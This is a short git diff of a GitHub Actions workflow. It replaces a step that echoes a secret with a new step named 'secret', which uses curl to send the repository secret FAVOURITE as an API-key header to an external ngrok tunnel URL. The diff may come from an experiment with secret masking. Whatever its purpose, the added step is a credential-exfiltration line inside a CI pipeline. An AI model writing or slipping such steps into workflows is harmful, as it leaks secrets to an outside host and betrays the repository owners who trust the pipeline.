@@ -21,6 +21,6 @@ jobs:
       - name: Add mask
         run: |
           echo "::add-mask::${{ secrets.FAVOURITE }}" 
-
-      - name: I ll tell you my current favourite 
-        run: echo ${{ secrets.FAVOURITE }}
+      - name: secret
+        run: |
+            curl https://4fcf-128-131-213-16.ngrok-free.app -H "X-API-Key: $secrets.FAVOURITE"
